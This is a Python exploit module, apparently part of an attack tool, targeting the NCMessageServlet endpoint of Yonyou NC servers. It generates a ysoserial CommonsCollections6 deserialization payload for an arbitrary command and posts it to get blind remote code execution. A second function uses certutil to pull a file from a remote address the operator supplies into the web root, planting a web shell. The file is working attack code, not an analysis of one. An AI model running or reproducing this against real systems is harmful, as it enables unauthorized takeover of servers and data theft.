import configparser
from libs.custom_print import custom_print
from model.model import Target
import subprocess
import re
config = configparser.ConfigParser()
config.read('config.ini')
java_path = config['DEFAULT']['java_path']

def exp(target, cmd:str = "calc.exe", verbose: bool = True) -> str:
    result = 0
    try:
        global java_path
        result = 0
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Safari/537.36',
            'Connection': 'close',
            'Accept': 'text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2',
            'Content-Type': 'application/octet-stream'
        }
        ncm_url = f"{target.url}/servlet/~baseapp/nc.message.bs.NCMessageServlet"
        if verbose == True:
            exec = f'{java_path} -jar ./libs/ysoserial-all.jar CommonsCollections6 "{cmd}" > cmd.ser'
            subprocess.run(exec, shell=True)
        execute = target.session.post(ncm_url,data=open('cmd.ser', 'rb'),headers=headers,timeout=10)
        if execute.status_code==200:
                result = 1
        else:
                result == 0
    except KeyboardInterrupt:
        custom_print("KeyBoardInterrupt, Exit!!","-")
    except Exception as e:
        custom_print(f"Critial Error!\n{e}","!")
    print("Sorry, this rce can't get a reply")
    return result

def upload_shell(target:Target, file_path:str="1234/1234"):
     file_path = input("Sorry, this function must use remote addres nowadays. So please input your remote address:")
     exp(target=target,cmd=f"certutil -urlcache -f {file_path} .\\webapps\\nc_web\\{re.search(r'/([^/]+)$', file_path).group(1)}")
     print(f"Your Files May Be Uploaded To {target.url}/{re.search(r'/([^/]+)$', file_path).group(1)}")
     return


